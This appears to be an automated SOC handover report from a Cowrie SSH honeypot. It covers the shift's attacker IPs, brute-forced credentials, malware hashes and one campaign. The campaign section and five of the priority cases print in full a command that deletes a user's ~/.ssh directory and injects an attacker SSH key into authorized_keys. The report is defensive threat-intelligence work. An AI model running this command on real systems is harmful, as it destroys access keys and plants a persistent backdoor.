# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-31 |
| **Generated At** | 2026-03-31T15:00:10Z |
| **Shift Time** | 15:00 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **69** |
| Confirmed Threats | **34** |
| False Positives Filtered | **35** (50.7%) |
| Unique Attacker IPs | **34** |
| Countries of Origin | **16** |
| High Severity Cases | **10** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **59** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **24** |
| Unique Credential Pairs | **16** |
| Unique Usernames | **8** |
| Unique Passwords | **16** |
| Successful Auth Pairs | **10** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 10 |
| `345gs5662d34` | 5 |
| `oracle` | 3 |
| `unknown` | 2 |
| `nobody` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 5 |
| `3245gs5662d34` | 5 |
| `P@ssw0rd` | 1 |
| `121212` | 1 |
| `4444` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 5 |
| `root` | `3245gs5662d34` | 5 |
| `oracle` | `P@ssw0rd` | 1 |
| `oracle` | `121212` | 1 |
| `unknown` | `4444` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root@123.` | `211.253.9.49` | 2026-03-31T13:33:00 |
| `root` | `3245gs5662d34` | `211.253.9.49` | 2026-03-31T13:33:03 |
| `root` | `hik12345` | `103.172.205.139` | 2026-03-31T13:42:14 |
| `root` | `3245gs5662d34` | `103.172.205.139` | 2026-03-31T13:42:19 |
| `root` | `manuel123` | `43.153.150.130` | 2026-03-31T14:28:46 |
| `root` | `3245gs5662d34` | `43.153.150.130` | 2026-03-31T14:28:50 |
| `root` | `Hd123456` | `201.249.205.94` | 2026-03-31T14:43:07 |
| `root` | `3245gs5662d34` | `201.249.205.94` | 2026-03-31T14:43:13 |
| `root` | `huanmu1234` | `103.228.37.49` | 2026-03-31T14:49:56 |
| `root` | `3245gs5662d34` | `103.228.37.49` | 2026-03-31T14:49:59 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `201.249.205.94`, `211.253.9.49`, `43.153.150.130`, `103.172.205.139`, `103.228.37.49`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **34** |
| Unique ASNs | **26** |
| High-Risk ASNs | **19** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET-BACKBONE | 5 | HIGH |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | LOW |
| `AS24757` | Ethio Telecom | 2 | HIGH |
| `AS55836` | Reliance Jio Infocomm Limited | 1 | LOW |
| `AS134756` | CHINANET Nanjing Jishan IDC network | 1 | HIGH |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 1 | MEDIUM |
| `AS141452` | Jhongkar IT | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (10)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-07ef0ac522a4

| Field | Detail |
|---|---|
| **Source IP** | `211.253.9[.]49` |
| **First Seen** | 2026-03-31 13:32 |
| **Last Seen** | 2026-03-31 13:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 13:32:59` | `cowrie.session.connect` |
| `2026-03-31 13:32:59` | `cowrie.client.version` |
| `2026-03-31 13:32:59` | `cowrie.client.kex` |
| `2026-03-31 13:33:00` | `cowrie.login.success` |
| `2026-03-31 13:33:00` | `cowrie.session.params` |
| `2026-03-31 13:33:00` | `cowrie.command.input` |
| `2026-03-31 13:33:00` | `cowrie.command.failed` |
| `2026-03-31 13:33:00` | `cowrie.log.closed` |
| `2026-03-31 13:33:00` | `cowrie.session.params` |
| `2026-03-31 13:33:00` | `cowrie.command.input` |
| `2026-03-31 13:33:01` | `cowrie.session.file_download` |
| `2026-03-31 13:33:01` | `cowrie.log.closed` |
| `2026-03-31 13:33:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.253.9[.]49` to AbuseIPDB if not already reported
- [ ] Block `211.253.9[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-267deb909e90

| Field | Detail |
|---|---|
| **Source IP** | `211.253.9[.]49` |
| **First Seen** | 2026-03-31 13:33 |
| **Last Seen** | 2026-03-31 13:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 13:33:03` | `cowrie.session.connect` |
| `2026-03-31 13:33:03` | `cowrie.client.version` |
| `2026-03-31 13:33:03` | `cowrie.client.kex` |
| `2026-03-31 13:33:03` | `cowrie.login.success` |
| `2026-03-31 13:33:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.253.9[.]49` to AbuseIPDB if not already reported
- [ ] Block `211.253.9[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50f3fe08ca0b

| Field | Detail |
|---|---|
| **Source IP** | `103.172.205[.]139` |
| **First Seen** | 2026-03-31 13:42 |
| **Last Seen** | 2026-03-31 13:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 13:42:13` | `cowrie.session.connect` |
| `2026-03-31 13:42:13` | `cowrie.client.version` |
| `2026-03-31 13:42:13` | `cowrie.client.kex` |
| `2026-03-31 13:42:14` | `cowrie.login.success` |
| `2026-03-31 13:42:14` | `cowrie.session.params` |
| `2026-03-31 13:42:14` | `cowrie.command.input` |
| `2026-03-31 13:42:14` | `cowrie.command.failed` |
| `2026-03-31 13:42:14` | `cowrie.log.closed` |
| `2026-03-31 13:42:15` | `cowrie.session.params` |
| `2026-03-31 13:42:15` | `cowrie.command.input` |
| `2026-03-31 13:42:15` | `cowrie.session.file_download` |
| `2026-03-31 13:42:15` | `cowrie.log.closed` |
| `2026-03-31 13:42:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.205[.]139` to AbuseIPDB if not already reported
- [ ] Block `103.172.205[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7113d97bc301

| Field | Detail |
|---|---|
| **Source IP** | `103.172.205[.]139` |
| **First Seen** | 2026-03-31 13:42 |
| **Last Seen** | 2026-03-31 13:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 13:42:18` | `cowrie.session.connect` |
| `2026-03-31 13:42:18` | `cowrie.client.version` |
| `2026-03-31 13:42:18` | `cowrie.client.kex` |
| `2026-03-31 13:42:19` | `cowrie.login.success` |
| `2026-03-31 13:42:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.205[.]139` to AbuseIPDB if not already reported
- [ ] Block `103.172.205[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1db47b4ceb0

| Field | Detail |
|---|---|
| **Source IP** | `43.153.150[.]130` |
| **First Seen** | 2026-03-31 14:28 |
| **Last Seen** | 2026-03-31 14:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 14:28:45` | `cowrie.session.connect` |
| `2026-03-31 14:28:45` | `cowrie.client.version` |
| `2026-03-31 14:28:45` | `cowrie.client.kex` |
| `2026-03-31 14:28:46` | `cowrie.login.success` |
| `2026-03-31 14:28:46` | `cowrie.session.params` |
| `2026-03-31 14:28:46` | `cowrie.command.input` |
| `2026-03-31 14:28:46` | `cowrie.command.failed` |
| `2026-03-31 14:28:46` | `cowrie.log.closed` |
| `2026-03-31 14:28:47` | `cowrie.session.params` |
| `2026-03-31 14:28:47` | `cowrie.command.input` |
| `2026-03-31 14:28:47` | `cowrie.session.file_download` |
| `2026-03-31 14:28:47` | `cowrie.log.closed` |
| `2026-03-31 14:28:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.153.150[.]130` to AbuseIPDB if not already reported
- [ ] Block `43.153.150[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80de721d2549

| Field | Detail |
|---|---|
| **Source IP** | `43.153.150[.]130` |
| **First Seen** | 2026-03-31 14:28 |
| **Last Seen** | 2026-03-31 14:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 14:28:49` | `cowrie.session.connect` |
| `2026-03-31 14:28:49` | `cowrie.client.version` |
| `2026-03-31 14:28:49` | `cowrie.client.kex` |
| `2026-03-31 14:28:50` | `cowrie.login.success` |
| `2026-03-31 14:28:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.153.150[.]130` to AbuseIPDB if not already reported
- [ ] Block `43.153.150[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a36a4d00d25

| Field | Detail |
|---|---|
| **Source IP** | `201.249.205[.]94` |
| **First Seen** | 2026-03-31 14:43 |
| **Last Seen** | 2026-03-31 14:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 14:43:05` | `cowrie.session.connect` |
| `2026-03-31 14:43:05` | `cowrie.client.version` |
| `2026-03-31 14:43:05` | `cowrie.client.kex` |
| `2026-03-31 14:43:07` | `cowrie.login.success` |
| `2026-03-31 14:43:07` | `cowrie.session.params` |
| `2026-03-31 14:43:07` | `cowrie.command.input` |
| `2026-03-31 14:43:07` | `cowrie.command.failed` |
| `2026-03-31 14:43:07` | `cowrie.log.closed` |
| `2026-03-31 14:43:08` | `cowrie.session.params` |
| `2026-03-31 14:43:08` | `cowrie.command.input` |
| `2026-03-31 14:43:08` | `cowrie.session.file_download` |
| `2026-03-31 14:43:08` | `cowrie.log.closed` |
| `2026-03-31 14:43:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.249.205[.]94` to AbuseIPDB if not already reported
- [ ] Block `201.249.205[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-061cf9dd209c

| Field | Detail |
|---|---|
| **Source IP** | `201.249.205[.]94` |
| **First Seen** | 2026-03-31 14:43 |
| **Last Seen** | 2026-03-31 14:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 14:43:12` | `cowrie.session.connect` |
| `2026-03-31 14:43:12` | `cowrie.client.version` |
| `2026-03-31 14:43:12` | `cowrie.client.kex` |
| `2026-03-31 14:43:13` | `cowrie.login.success` |
| `2026-03-31 14:43:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.249.205[.]94` to AbuseIPDB if not already reported
- [ ] Block `201.249.205[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10b6f9ba7c5e

| Field | Detail |
|---|---|
| **Source IP** | `103.228.37[.]49` |
| **First Seen** | 2026-03-31 14:49 |
| **Last Seen** | 2026-03-31 14:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 14:49:55` | `cowrie.session.connect` |
| `2026-03-31 14:49:55` | `cowrie.client.version` |
| `2026-03-31 14:49:55` | `cowrie.client.kex` |
| `2026-03-31 14:49:56` | `cowrie.login.success` |
| `2026-03-31 14:49:56` | `cowrie.session.params` |
| `2026-03-31 14:49:56` | `cowrie.command.input` |
| `2026-03-31 14:49:56` | `cowrie.command.failed` |
| `2026-03-31 14:49:56` | `cowrie.log.closed` |
| `2026-03-31 14:49:56` | `cowrie.session.params` |
| `2026-03-31 14:49:56` | `cowrie.command.input` |
| `2026-03-31 14:49:56` | `cowrie.session.file_download` |
| `2026-03-31 14:49:56` | `cowrie.log.closed` |
| `2026-03-31 14:49:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.228.37[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.228.37[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-814c81d6aa01

| Field | Detail |
|---|---|
| **Source IP** | `103.228.37[.]49` |
| **First Seen** | 2026-03-31 14:49 |
| **Last Seen** | 2026-03-31 14:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 14:49:58` | `cowrie.session.connect` |
| `2026-03-31 14:49:58` | `cowrie.client.version` |
| `2026-03-31 14:49:58` | `cowrie.client.kex` |
| `2026-03-31 14:49:59` | `cowrie.login.success` |
| `2026-03-31 14:49:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.228.37[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.228.37[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `1.193.163[.]2` | 1 | 2026-03-31 14:50 | 2026-03-31 14:50 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.105.214[.]20` | 1 | 2026-03-31 13:41 | 2026-03-31 13:41 | 13s | 0 | `T1592` | 🟢 LOW |
| `103.163.44[.]118` | 1 | 2026-03-31 13:28 | 2026-03-31 13:28 | 8s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.172.205[.]139` | 1 | 2026-03-31 13:42 | 2026-03-31 13:42 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.228.37[.]49` | 1 | 2026-03-31 14:49 | 2026-03-31 14:49 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.6.11[.]184` | 1 | 2026-03-31 14:31 | 2026-03-31 14:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `113.160.140[.]138` | 1 | 2026-03-31 13:25 | 2026-03-31 13:25 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `115.151.72[.]122` | 1 | 2026-03-31 14:27 | 2026-03-31 14:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.202.148[.]19` | 1 | 2026-03-31 14:52 | 2026-03-31 14:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.103.119[.]98` | 1 | 2026-03-31 14:58 | 2026-03-31 14:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.110.149[.]157` | 1 | 2026-03-31 14:33 | 2026-03-31 14:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `191.36.152[.]28` | 1 | 2026-03-31 14:10 | 2026-03-31 14:12 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `196.188.187[.]205` | 1 | 2026-03-31 14:48 | 2026-03-31 14:48 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `196.189.59[.]226` | 1 | 2026-03-31 13:30 | 2026-03-31 13:30 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `201.249.205[.]94` | 1 | 2026-03-31 14:43 | 2026-03-31 14:43 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.253.9[.]49` | 1 | 2026-03-31 13:33 | 2026-03-31 13:33 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.153.150[.]130` | 1 | 2026-03-31 14:28 | 2026-03-31 14:28 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.56.79[.]53` | 1 | 2026-03-31 13:32 | 2026-03-31 13:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]252` | 1 | 2026-03-31 14:32 | 2026-03-31 14:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.142.79[.]72` | 1 | 2026-03-31 14:46 | 2026-03-31 14:47 | 14s | 0 | `T1592` | 🟢 LOW |
| `60.166.8[.]174` | 1 | 2026-03-31 13:45 | 2026-03-31 13:45 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `61.164.252[.]244` | 1 | 2026-03-31 14:59 | 2026-03-31 14:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.20.217[.]64` | 1 | 2026-03-31 14:05 | 2026-03-31 14:05 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `87.103.126[.]54` | 1 | 2026-03-31 14:45 | 2026-03-31 14:45 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `61.164.252[.]244` | CN | yunqikeji-coltd | **100** ⚠️ | 3 |
| `103.228.37[.]49` | VN | DXT DIGITAL TRANSFORMATION TECHNOLOGY JOINT STOCK COMPANY | **100** ⚠️ | 7 |
| `45.56.79[.]53` | US | Linode | **100** ⚠️ | 50 |
| `1.193.163[.]2` | CN | CHINANET henan province network | **100** ⚠️ | 50 |
| `103.105.214[.]20` | PH | Fil Products Residential Fiber Internet | **100** ⚠️ | 22 |
| `113.160.140[.]138` | VN | Vietnam Posts and Telecommunications Group | **100** ⚠️ | 30 |
| `103.172.205[.]139` | ID | PT Cloud Hosting Indonesia | **100** ⚠️ | 50 |
| `103.163.44[.]118` | IN | Infonet Accurate Appz India Pvt Ltd | **100** ⚠️ | 50 |
| `191.36.152[.]28` | BR | VIPTURBO COMÉRCIO & SERVIÇOS DE INFORMÁTICA LTDA | **100** ⚠️ | 50 |
